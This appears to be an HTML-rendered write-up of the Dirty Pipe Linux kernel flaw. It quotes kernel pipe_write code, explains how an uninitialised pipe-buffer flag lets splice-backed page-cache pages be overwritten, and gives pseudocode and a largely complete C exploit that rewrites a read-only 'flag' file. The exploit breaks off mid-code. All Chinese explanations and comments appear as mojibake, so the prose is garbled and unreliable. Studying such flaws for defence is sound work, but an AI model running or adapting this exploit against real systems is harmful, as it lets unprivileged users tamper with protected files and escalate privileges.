<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span></span><br><span class="line"><span class="function"><span class="title">pipe_write</span><span class="params">(struct kiocb *iocb, struct iov_iter *from)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span> =</span> iocb-&gt;ki_filp;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> filp-&gt;private_data;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> head;</span><br><span class="line">	<span class="keyword">ssize_t</span> ret = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">size_t</span> total_len = iov_iter_count(from);</span><br><span class="line">	<span class="keyword">ssize_t</span> chars;</span><br><span class="line">	<span class="keyword">bool</span> was_empty = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">bool</span> wake_next_writer = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(total_len == <span class="number">0</span>))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	__pipe_lock(pipe);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!pipe-&gt;readers) &#123;</span><br><span class="line">		send_sig(SIGPIPE, current, <span class="number">0</span>);</span><br><span class="line">		ret = -EPIPE;</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="keyword">if</span> (pipe-&gt;watch_queue) &#123;</span><br><span class="line">		ret = -EXDEV;</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	head = pipe-&gt;head; <span class="comment">/* Ëé∑ÂèñÁºìÂÜ≤Âå∫ÁîüÊàêÁÇπ(Áî®‰∫éÂÜôÂÖ•) */</span></span><br><span class="line">	was_empty = pipe_empty(head, pipe-&gt;tail); <span class="comment">/* Ê£ÄÊü•ÁÆ°ÈÅìÊòØÂê¶‰∏∫Á©∫ */</span> </span><br><span class="line">	chars = total_len &amp; (PAGE_SIZE<span class="number">-1</span>);</span><br><span class="line">	<span class="keyword">if</span> (chars &amp;&amp; !was_empty) &#123; <span class="comment">/* ÁºìÂ≠òÈ°µ‰∏ç‰∏∫Á©∫ */</span></span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask]; <span class="comment">/* ÈÄöËøáheadÁ¥¢ÂºïÂà∞ÂØπÂ∫îÁöÑpipe_buffer */</span></span><br><span class="line">		<span class="keyword">int</span> offset = buf-&gt;offset + buf-&gt;len; </span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Â¶ÇÊûúflag‰∏∫PIPE_BUF_FLAG_CAN_MERGEÂàôÂÖÅËÆ∏Âú®ÂΩìÂâçÈ°µÈù¢Áª≠ÂÜô */</span></span><br><span class="line">		<span class="keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;</span><br><span class="line">		    offset + chars &lt;= PAGE_SIZE) &#123;</span><br><span class="line">  </span><br><span class="line">			ret = pipe_buf_confirm(pipe, buf); <span class="comment">/* Ê£ÄÊü•ÊòØÂê¶ÂÜôË∑®È°µ */</span></span><br><span class="line">			<span class="keyword">if</span> (ret)</span><br><span class="line">				<span class="keyword">goto</span> out; <span class="comment">/* ‰ºöÂºïÂèëÂÜôË∑®È°µ(ÂàÜÈÖç‰∏Ä‰∏™Êñ∞ÁöÑÂÜÖÂ≠òÈ°µÊù•Ë£ÖÊï∞ÊçÆ) */</span></span><br><span class="line"></span><br><span class="line">			ret = copy_page_from_iter(buf-&gt;page, offset, chars, from); <span class="comment">/* Â∞ÜÊï∞ÊçÆ‰ªéÁî®Êà∑‰º†Êù•ÁöÑfrom,Êã∑Ë¥ùÂà∞pipe_buf-&gt;page */</span></span><br><span class="line">			<span class="keyword">if</span> (unlikely(ret &lt; chars)) &#123;</span><br><span class="line">				ret = -EFAULT;</span><br><span class="line">				<span class="keyword">goto</span> out;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			buf-&gt;len += ret;</span><br><span class="line">			<span class="keyword">if</span> (!iov_iter_count(from))</span><br><span class="line">				<span class="keyword">goto</span> out;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">    </span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">if</span> (pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage))</span><br><span class="line">		wake_next_writer = <span class="literal">false</span>;</span><br><span class="line">	__pipe_unlock(pipe);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (was_empty) &#123;</span><br><span class="line">		wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);</span><br><span class="line">		kill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (wake_next_writer)</span><br><span class="line">		wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);</span><br><span class="line">	<span class="keyword">if</span> (ret &gt; <span class="number">0</span> &amp;&amp; sb_start_write_trylock(file_inode(filp)-&gt;i_sb)) &#123;</span><br><span class="line">		<span class="keyword">int</span> err = file_update_time(filp);</span><br><span class="line">		<span class="keyword">if</span> (err)</span><br><span class="line">			ret = err;</span><br><span class="line">		sb_end_write(file_inode(filp)-&gt;i_sb);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>ÈáçÁÇπÊ≥®ÊÑèËØ•ÂáΩÊï∞ÂØπ <code>PIPE_BUF_FLAG_CAN_MERGE</code> ÁöÑÂ§ÑÁêÜÔºåÂ¶ÇÊûú flag ‰∏≠ÊúâËØ•Ê†áÂøó‰ΩçÔºåÂ∞±‰ºöË∞ÉÁî® <code>copy_page_from_iter</code> ÂáΩÊï∞Â∞ÜÊï∞ÊçÆÂ§çÂà∂Âà∞ÁÆ°ÈÅìÁºìÂÜ≤Âå∫</li>
</ul>
<p><strong>Dirty Pipe ÊºèÊ¥ûÂà©Áî®</strong></p>
<p>ÂØπ‰∫éËÉΩÂê¶Â∞ÜÊï∞ÊçÆÈôÑÂä†Ëá≥‰∏Ä‰∏™ÁÆ°ÈÅìÁºìÂÜ≤Âå∫ÔºåÂÜÖÊ†∏ÈááÁî®‰∫ÜÂ¶Ç‰∏ãÁöÑÊú∫Âà∂Ôºö </p>
<ul>
<li>Linux 2.6.16 ‰ª•ÂâçÔºå<code>pipe_buf_operations</code> ÁªìÊûÑÊúâ‰∏Ä‰∏™ÂçïÁã¨ÁöÑ flag Âè´ÂÅö <code>can_merge</code>Ôºå‰∏ãÈù¢ËøôË°å if ËØ≠Âè•ÈÄöËøáÂàôÂÖÅËÆ∏Âú®ÂΩìÂâçÈ°µÈù¢Áª≠ÂÜô</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ops-&gt;can_merge &amp;&amp; offset + chars &lt;= PAGE_SIZE) &#123;</span><br></pre></td></tr></table></figure>
<ul>
<li>Linux 2.6.16 Ëµ∑Ôºå‰∏∫‰∫ÜÊîØÊåÅ <code>splice</code> Ë∞ÉÁî®ÔºåÂºïÂÖ•‰∫Ü <code>page_cache_pipe_buf_ops</code>ÔºåÂÆÉÂÆûÈôÖ‰∏äÊòØ‰∏Ä‰∏™ËÆæÁΩÆ‰∫Ü <code>can_merge=0</code> ÁöÑ <code>pipe_buf_operations</code>ÔºåÁî®Êù•ÊåáÁ§∫ËøôÈÉ®ÂàÜÈ°µ‰∏çËÉΩË¢´ÁÆ°ÈÅìÂÜôÂÖ•</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> <span class="title">page_cache_pipe_buf_ops</span> =</span> &#123;</span><br><span class="line">	.can_merge = <span class="number">0</span>,</span><br><span class="line">	.<span class="built_in">map</span> = generic_pipe_buf_map,</span><br><span class="line">	.unmap = generic_pipe_buf_unmap,</span><br><span class="line">	.confirm = page_cache_pipe_buf_confirm,</span><br><span class="line">	.release = page_cache_pipe_buf_release,</span><br><span class="line">	.steal = page_cache_pipe_buf_steal,</span><br><span class="line">	.get = generic_pipe_buf_get,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>Linux 5.0 ‰∏≠ÔºåÁî±‰∫éÂè™Êúâ‰∏ÄÁßçÁÆ°ÈÅìÁºìÂÜ≤Âå∫Á±ªÂûãÂèØ‰ª•ËøΩÂä†Êñ∞Êï∞ÊçÆÔºåÂØπ <code>can_merge</code> ÁöÑÊ£ÄÊü•Ë¢´‰øÆÊîπ‰∏∫Âè™Ê£ÄÊü•Á±ªÂûãÊòØÂê¶ÊòØ <code>anon_pipe_buf_ops</code>ÔºàËøôÂ∞±ÊòØÈÇ£‰∏™ÂîØ‰∏ÄÂèØËøΩÂä†ÂÜÖÂÆπÁöÑÁ±ªÂûãÔºâ</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (pipe_buf_can_merge(buf) &amp;&amp; offset + chars &lt;= PAGE_SIZE) &#123;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">pipe_buf_can_merge</span><span class="params">(struct pipe_buffer *buf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> buf-&gt;ops == &amp;anon_pipe_buf_ops;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Linux 5.8 ‰∏≠ÂèàÂ∞Ü <code>pipe_buf_operations</code> Á±ªÂûãÁöÑÊØîËæÉ‰øÆÊîπ‰∏∫ <code>pipe_buffer</code>ÁöÑ‰∏Ä‰∏™ flagÔºö<code>PIPE_BUF_FLAG_CAN_MERGE</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;</span><br><span class="line">		    offset + chars &lt;= PAGE_SIZE) &#123;</span><br></pre></td></tr></table></figure>
<p>Linux 4.9 Ê∑ªÂä†‰∫Ü‰∏§‰∏™Êñ∞ÂáΩÊï∞ <code>copy_page_to_iter_pipe</code> Âíå <code>push_pipe</code> ÔºåÂÆÉ‰ª¨ÂàÜÈÖç‰∫ÜÊñ∞ÁöÑÁÆ°ÈÅìÁºìÂÜ≤Âå∫Ôºå‰ΩÜÂπ∂Ê≤°ÊúâÂàùÂßãÂåñ flagÔºàÂΩìÊó∂ flag ÁöÑ‰ΩúÁî®Âπ∂‰∏çÂ§ßÔºâ</p>
<p>Linux 5.8 ÂØπ flag ÊúâÊâÄËøêÁî®ÔºåÊ≤°ÊúâÂàùÂßãÂåñ flagÔºåÊÑèÂë≥ÁùÄ‰πãÂâçÈÅóÁïô‰∏ãÊù•ÁöÑ <code>PIPE_BUF_FLAG_CAN_MERGE</code> Ê†áÂøó‰Ωç‰∏ç‰ºöË¢´ <code>splice</code> Á≥ªÁªüË∞ÉÁî®Ê∏ÖÁ©∫ÔºåËøôÂèØËÉΩ‰ºöÂΩ±ÂìçÂêéÁª≠Êüê‰∫õÂáΩÊï∞ÁöÑÊâßË°åÊµÅÁ®ã</p>
<p>ÊºèÊ¥ûÂà©Áî®ÁöÑÊÄùË∑Ø‰∏∫Ôºö</p>
<ul>
<li>ÂàõÂª∫ÁÆ°ÈÅì</li>
<li>Áî®‰ªªÊÑèÊï∞ÊçÆÂ°´ÂÖÖÁÆ°ÈÅìÔºà‰∏∫Êï¥‰∏™ÁºìÂÜ≤Âå∫ÁéØÁªìÊûÑËÆæÁΩÆ <code>PIPE_BUF_FLAG_CAN_MERGE</code> Ê†áËÆ∞Ôºâ</li>
<li>Ê∏ÖÁ©∫ÁÆ°ÈÅìÔºà‰øùÁïô <code>pipe_inode_info</code> ÁéØ‰∏≠ÊØè‰∏Ä‰∏™ÁºìÂÜ≤Âå∫ÁöÑ flag Ôºâ</li>
<li>‰ΩøÁî® <code>splice</code> Â∞ÜÁõÆÊ†áÊñá‰ª∂Ôºà‰ª•Âè™ËØªÊñπÂºèÊâìÂºÄÔºâ‰∏≠ÁöÑÊï∞ÊçÆ‰ªéÁõÆÊ†áÂÅèÁßª‰πãÂâçÁöÑ‰ΩçÁΩÆÊîæÂÖ•Âà∞ÁÆ°ÈÅì‰∏≠</li>
<li>Â∞Ü‰ªªÊÑèÊï∞ÊçÆÂÜôÂÖ•ÁÆ°ÈÅìÔºåÊ≠§Êï∞ÊçÆÂ∞ÜË¶ÜÁõñÁºìÂ≠òÁöÑÊñá‰ª∂È°µÈù¢ÔºåËÄå‰∏çÊòØÂàõÂª∫Êñ∞ÁöÑÂåøÂêçÁºìÂÜ≤Âå∫ </li>
</ul>
<p>‰º™‰ª£Á†ÅÂ¶Ç‰∏ãÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pipe(p);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ÂÆåÂÖ®Â°´ÂÖÖÁÆ°ÈÅì,ÊØè‰∏™pipe_bufferÁé∞Âú®Â∞ÜÊã•PIPE_BUF_FLAG_CAN_MERGE flag */</span></span><br><span class="line"><span class="keyword">for</span> (r = pipe_size ; r &gt; <span class="number">0</span> ; )&#123; </span><br><span class="line">    n = r &gt; <span class="keyword">sizeof</span>(buffer) ? <span class="keyword">sizeof</span>(buffer) : r;</span><br><span class="line">    write(p[<span class="number">1</span>], buffer, n);   </span><br><span class="line">    r -= n</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ÊéíÁ©∫ÁÆ°ÈÅì,ÈáäÊîæÊâÄÊúâpipe_bufferÂÆû‰æã(‰ΩÜÊòØ‰øùÁïôÊ†áÂøóÂàùÂßãÂåñ) */</span></span><br><span class="line"><span class="keyword">for</span> (r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">    n = r &gt; <span class="keyword">sizeof</span>(buffer) ? <span class="keyword">sizeof</span>(buffer) : r;</span><br><span class="line">    read(p[<span class="number">0</span>], buffer, n);</span><br><span class="line">    r -= n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fd = open(<span class="string">&quot;target&quot;</span>, O_RDONLY); </span><br><span class="line">--offset;</span><br><span class="line">splice(fd, &amp;offset, p[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>); <span class="comment">/* Â∞ÜÊåáÂÆöÂÅèÁßªÈáè‰πãÂâçÁöÑ‰∏Ä‰∏™Â≠óËäÇÊãºÊé•Âà∞ÁÆ°ÈÅì,ËøôÂ∞ÜÊ∑ªÂä†ÂØπÈ°µÈù¢ÁºìÂ≠òÁöÑÂºïÁî®,‰ΩÜPIPE_BUF_FLAG_CAN_MERGEÁöÑÁä∂ÊÄÅ‰æùÁÑ∂ÊúâÊïà */</span></span><br><span class="line"></span><br><span class="line">write(p[<span class="number">1</span>], data, data_size); <span class="comment">/* ‰∏ç‰ºöÂàõÂª∫Êñ∞ÁöÑpipe_buffer,ËÄåÊòØ‰ºöÂÜôÂÖ•È°µÈù¢ÁºìÂ≠ò */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>Ë∞ÉÁî® <code>splice</code> ÂáΩÊï∞ÂèØ‰ª•ÈÄöËøá‚ÄúÈõ∂Êã∑Ë¥ù‚ÄùÁöÑÂΩ¢ÂºèÂ∞ÜÊñá‰ª∂ÂèëÈÄÅÂà∞ pipeÔºà‰ª£Á†ÅÂ±ÇÈù¢ÁöÑÈõ∂Êã∑Ë¥ùÊòØÁõ¥Êé•Â∞ÜÊñá‰ª∂ÁºìÂ≠òÈ°µ page cache ‰Ωú‰∏∫ pipe ÁöÑÁºìÂ≠òÈ°µ‰ΩøÁî®Ôºâ</li>
<li>‰ΩÜËøôÈáåÂºïÂÖ•‰∫Ü‰∏Ä‰∏™ÂèòÈáèÊú™ÂàùÂßãÂåñÊºèÊ¥ûÔºåÂØºËá¥Êñá‰ª∂ÁºìÂ≠òÈ°µ‰ºöÂú®ÂêéÁª≠ pipe ÈÄöÈÅì‰∏≠Ë¢´ÂΩìÊàêÊôÆÈÄö pipe ÁºìÂ≠òÈ°µËÄåË¢´‚ÄúÁª≠ÂÜô‚ÄùËøõËÄåË¢´ÁØ°Êîπ</li>
<li>ÁÑ∂ËÄåÔºåÂú®ËøôÁßçÊÉÖÂÜµ‰∏ãÔºåÂõ†‰∏∫Ê≤°ÊúâÂÖ∂‰ªñÂèØÂÜôÊùÉÈôêÁöÑÁ®ãÂ∫èËøõË°å write Êìç‰ΩúÔºåÊâÄ‰ª•ÂÜÖÊ†∏Âπ∂‰∏ç‰ºöÂ∞ÜËøô‰∏™ÁºìÂ≠òÈ°µÂà§ÂÆö‰∏∫‚ÄúËÑèÈ°µ‚ÄùÔºåÁü≠Êó∂Èó¥ÂÜÖ(Âà∞‰∏ãÊ¨°ÈáçÂêØ‰πãÁ±ªÁöÑ)‰∏ç‰ºöÂà∑Êñ∞Âà∞Á£ÅÁõò</li>
<li>Âú®ËøôÊÆµÊó∂Èó¥ÂÜÖÊâÄÊúâËÆøÈóÆËØ•Êñá‰ª∂ÁöÑÂú∫ÊôØÈÉΩÂ∞Ü‰ΩøÁî®Ë¢´ÁØ°ÊîπÁöÑÊñá‰ª∂ÁºìÂ≠òÈ°µÔºå‰πüÂ∞±ËææÊàê‰∫Ü‰∏Ä‰∏™‚ÄúÁü≠Êó∂Èó¥ÂÜÖÂØπ‰ªªÊÑèÂèØËØªÊñá‰ª∂‰ªªÊÑèÂÜô‚ÄùÁöÑÊìç‰Ωú</li>
</ul>
<p><strong>Dirty Pipe ÊºèÊ¥ûÂ§çÁé∞</strong></p>
<p>1.‰øÆÊîπÊúçÂä°Âô®‰∏ä flag Êñá‰ª∂ÁöÑÂÄºÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PAGE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE 4096</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">prepare_pipe</span><span class="params">(<span class="keyword">int</span> p[<span class="number">2</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(p)) <span class="built_in">abort</span>();</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">unsigned</span> pipe_size = fcntl(p[<span class="number">1</span>], F_GETPIPE_SZ);</span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">                <span class="keyword">unsigned</span> n = r &gt; <span class="keyword">sizeof</span>(buffer) ? <span class="keyword">sizeof</span>(buffer) : r;</span><br><span class="line">                write(p[<span class="number">1</span>], buffer, n);</span><br><span class="line">                r -= n;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">                <span class="keyword">unsigned</span> n = r &gt; <span class="keyword">sizeof</span>(buffer) ? <span class="keyword">sizeof</span>(buffer) : r;</span><br><span class="line">                read(p[<span class="number">0</span>], buffer, n);</span><br><span class="line">                r -= n;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> path = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="keyword">loff_t</span> offset = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> data = <span class="string">&quot;lag&#123;pipeeee&#125;&quot;</span>; </span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">size_t</span> data_size = <span class="built_in">strlen</span>(data);</span><br><span class="line">        <span class="keyword">if</span> (offset % PAGE_SIZE == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot start writing at a page boundary\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">loff_t</span> next_page = (offset | (PAGE_SIZE - <span class="number">1</span>)) + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">loff_t</span> end_offset = offset + (<span class="keyword">loff_t</span>)data_size;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (end_offset &gt; next_page) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot write across a page boundary\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">int</span> fd = open(path, O_RDONLY); </span><br><span class="line">        <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                perror(<span class="string">&quot;open failed&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">        <span class="keyword">if</span> (fstat(fd, &amp;st)) &#123;</span><br><span class="line">                perror(<span class="string">&quot;stat failed&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;st.st_size:0x%lx\n&quot;</span>,st.st_size);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (offset &gt; st.st_size) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Offset is not inside the file\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span 